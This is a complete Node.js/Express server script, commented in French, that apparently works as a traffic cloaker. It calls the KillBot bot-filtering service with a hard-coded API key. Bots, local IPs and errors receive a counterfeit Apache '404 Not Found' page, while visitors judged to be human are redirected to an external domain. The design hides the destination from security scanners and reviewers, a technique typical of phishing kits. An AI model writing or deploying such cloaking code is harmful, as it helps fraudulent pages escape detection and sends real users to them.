// index.js

const express = require('express');
const KillBot = require('killbot.to');

const app = express();
const PORT = process.env.PORT || 3000;

// Clé KillBot
const apiKey = '225e7b97-524c-45d6-800c-aa7e3831a1ab';
const config = 'default';
const killBot = new KillBot(apiKey, config);

// Page HTML si “bloqué” (ou si IP locale)
const fake404 = `
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head><title>404 Not Found</title></head>
<body>
  <h1>Not Found</h1>
  <p>The requested URL was not found on this server.</p>
  <hr>
  <address>Apache/2.4.57 (Debian) Server Port 80</address>
</body></html>
`;

// Détecte si l'IP est “locale/invalide”
function isLocalIp(ip) {
  if (!ip) return true;
  return (
    ip.startsWith('127.') ||
    ip.startsWith('10.') ||
    ip.startsWith('192.168.') ||
    ip.startsWith('::1') ||
    ip === '0.0.0.0'
  );
}

app.get('/', (req, res) => {
  // Récupère l'IP depuis x-forwarded-for ou fallback
  let ip =
    req.headers['x-forwarded-for'] ||
    req.connection.remoteAddress ||
    '';

  // S'il y a plusieurs IPs dans x-forwarded-for, on prend la première
  if (ip.includes(',')) {
    ip = ip.split(',')[0].trim();
  }

  // Si l'IP est locale => on renvoie direct le fake404
  if (isLocalIp(ip)) {
    console.log('IP locale => bloc 404');
    return res.status(404).send(fake404);
  }

  // Sinon, on utilise killBot
  killBot.checkReq(req)
    .then(result => {
      if (result.block) {
        // Bloqué => faux 404
        return res.status(404).send(fake404);
      } else {
        // Autorisé => redirection
        return res.redirect('https://maurpie.com');
      }
    })
    .catch(err => {
      // En cas d’erreur KillBot (invalid IP, etc.), on renvoie 404
      console.error('KillBot error:', err);
      return res.status(404).send(fake404);
    });
});

app.listen(PORT, () => {
  console.log(`Server is listening on port ${PORT}`);
});